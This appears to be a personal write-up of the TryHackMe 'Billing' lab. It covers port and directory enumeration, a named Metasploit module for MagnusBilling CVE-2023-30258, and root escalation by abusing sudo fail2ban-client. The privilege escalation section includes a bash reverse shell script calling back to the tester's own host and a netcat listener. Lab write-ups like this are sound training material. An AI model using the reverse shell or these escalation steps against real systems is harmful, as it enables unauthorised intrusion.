---
title: 'TryHackMe: Billing'
date: 2026-07-20
---

## Room Overview

| Difficulty | Platform | Room | Topics |
|------------|----------|--------|
| Easy | TryHackMe | [Billing](https://tryhackme.com/room/billing) | RCE, Linux PrivEsc |


## Reconnaissance

- IP
- open ports
- initial service discovery

A first check with `nmap -sS -Pn -p- 10.113.136.251` reveals:

```
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
5038/tcp open  unknown
```

`nmap -v -sV -p22,80,3306,5038 210.113.136.251`

```
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Port 80, Apache and Website

`gobuster dir -u http://10.113.136.251 -w /usr/share/wordlists/dirb/common.txt` shows

index.php            (Status: 302) [Size: 1] [--> ./mbilling]

which seems to use `MagnusBilling`. Looking at the directory:

`gobuster dir -u http://10.113.136.251/mbilling/ -w /usr/share/wordlists/dirb/common.txt`

reveals

```
archive              (Status: 301) [Size: 327] [--> http://10.113.136.251/mbilling/archive/]
assets               (Status: 301) [Size: 326] [--> http://10.113.136.251/mbilling/assets/]
development.log      (Status: 403) [Size: 279]
fpdf                 (Status: 301) [Size: 324] [--> http://10.113.136.251/mbilling/fpdf/]
index.html           (Status: 200) [Size: 30760]
index.php            (Status: 200) [Size: 663]
lib                  (Status: 301) [Size: 323] [--> http://10.113.136.251/mbilling/lib/]
LICENSE              (Status: 200) [Size: 7652]
production.log       (Status: 403) [Size: 279]
protected            (Status: 403) [Size: 279]
resources            (Status: 301) [Size: 329] [--> http://10.113.136.251/mbilling/resources/]
spamlog.log          (Status: 403) [Size: 279]
tmp                  (Status: 301) [Size: 323] [--> http://10.113.136.251/mbilling/tmp/]
```

The HTML source code refers to a script `blue-neptune.json` which we find at `http://10.113.136.251/mbilling/blue-neptune.json`.

It contains `name "MBilling" version "6.0.0.0"`


### Asterisk

`telnet 10.113.136.251 5038` tells us: `Asterisk Call Manager/2.10.6`.

### MariaDB

We did not look for further information reg. MariaDB.


## Vulnerability Analysis

### SSH

The SSH version is affected by `CVE-2024-6387` ("regreSSHion"), but only 32 bit systems.
The most significant risk is Remote Code Execution, however this outcome requires significant resources to exploit.

### Apache and web application

`"MagnusBilling 6.x contains a critical unauthenticated Remote Code Execution (RCE) vulnerability tracked as `CVE-2023-30258`. It allows remote attackers to execute arbitrary OS commands with web server privileges by sending specially crafted HTTP requests to the application."`.

MetaSploit provides an exploit for this CVE: `exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258`

### MariaDB and Asterisk

Skipped.


## Initial Access

Using the MetaSploit exploit for `CVE-2023-30258`, we get initial access as user `asterisk`.


## Privilege Escalation

The first try using `sudo -l` reveals that user `asterisk` can execute several binaries with `sudo` permissions.
[GTFOBins](https://gtfobins.org/) shows that `fail2ban-client` which is among those can be used for privilege escalation.
It provides two possible approaches to exploit `fail2ban-client`.
We needed to use the approach (b) which sets up a `fail2ban` configuration directory.
The `action` triggers a script which starts a reverse shell tha we receive via `nc -lvnp 4444`.

```bash
cat >/tmp/root-shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<my_tun0_ipaddr>/4444 0>&1
EOF

chmod +x /tmp/root-shell.sh
```

The action is triggered when restarting `fail2ban` with the new directory:

`sudo fail2ban-client -c /path/to/temp-dir/ -v restart`


## Post Exploitation

We retrieve the flags from `/home/magnus/user.txt` and `/root/root.txt`.


## Lessons Learned

I am leaving most of the (futile) efforts away, but as always, these findings were not always straightforward.

After finishing the room, THM provides feedback for the approach, some of which I did not understand:

I was told to enumerate earlier with `sudo -l`, but that was about the first action I performed after gaining initial access.
It took me probably too long to understand how to exploit `fail2ban` via `sudo` and set it up correctly with the second approach described on [GTFOBins](https://gtfobins.org). 

